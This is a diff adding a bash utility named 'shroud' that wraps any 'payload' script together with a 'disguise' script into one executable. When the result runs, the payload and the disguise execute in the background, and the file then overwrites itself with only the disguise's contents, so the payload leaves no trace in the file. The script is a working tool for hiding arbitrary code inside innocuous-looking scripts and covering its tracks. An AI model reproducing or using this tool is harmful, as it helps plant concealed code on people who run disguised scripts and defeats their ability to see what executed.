@@ -1,0 +1,62 @@
+#!/bin/bash
+
+BASH_SHEBANG="#!/bin/bash"
+filename=""
+
+set_filename() {
+	filename="$1"
+	if [ -f "$filename" ]; then
+		i=1
+		# Pick a filename_i
+		while [ -f "$filename$i" ]; do
+			i=$(($i + 1))
+		done
+		filename=$filename$i
+	fi
+}
+
+shroud() {
+	# Set output name
+	if [ -z $3 ]; then
+		set_filename "$1"_shrouded_with_"$2"
+		output=$filename
+	else
+		set_filename "$3"
+		output=$filename
+	fi
+
+	# -- Implement Shrouding Mechanism: --
+	echo $BASH_SHEBANG >> $filename
+	# add payload
+	echo "execute_payload(){" >> $filename
+	cat $1 >> $filename
+	echo "" >> $filename
+	echo "}" >> $filename
+
+	# add disguise
+	echo "execute_disguise(){" >> $filename
+	cat $2 >> $filename
+	echo "" >> $filename
+	echo "}" >> $filename
+
+	# execute both scripts
+	echo "execute_payload &" >> $filename
+	echo "execute_disguise &" >> $filename
+
+	echo "echo \"\" > \"\$0\"" >> $filename
+	# add disguise
+	echo "cat > \"\$0\" <<EOF" >> $filename
+	cat $2 >> $filename
+	echo "" >> $filename
+	echo "EOF" >> $filename
+	chmod +x $filename
+}
+
+if [ "$#" -eq 2 ]; then
+	shroud $1 $2
+elif [ "$#" -eq 3 ]; then
+	shroud $1 $2 $3
+else
+	echo "usage: shroud <payload> <disguise> [output]"
+	echo "        generate file that executes as <payload> and then becomes <disguise>"
+fi
